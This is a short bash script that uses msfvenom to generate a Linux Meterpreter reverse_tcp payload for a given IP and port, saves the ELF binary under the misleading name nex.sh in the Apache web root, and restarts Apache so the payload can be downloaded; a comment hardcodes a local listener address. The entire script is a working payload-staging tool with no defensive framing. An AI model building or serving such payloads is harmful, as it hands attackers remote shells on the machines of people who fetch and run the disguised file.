#!/bin/bash
#msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.168 lport=4444 -f elf > /var/www/html/nex.sh

if [ "$(id -u)" != "0" ]
then
	echo "You need root & Kali"
 	exit 1
fi

if [ $# -eq 0 ]
then
	echo "<ip> <port>"
	exit 2
fi

#pending check data

file="/var/www/html/nex.sh"
if [ -f $file ]
then
	rm $file
	echo "The old nex has been removed... "
fi

echo "Creating new nex..."
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$1 lport=$2 -f elf > /var/www/html/nex.sh
service apache2 restart

echo ""
echo "nex has been created in apache..."


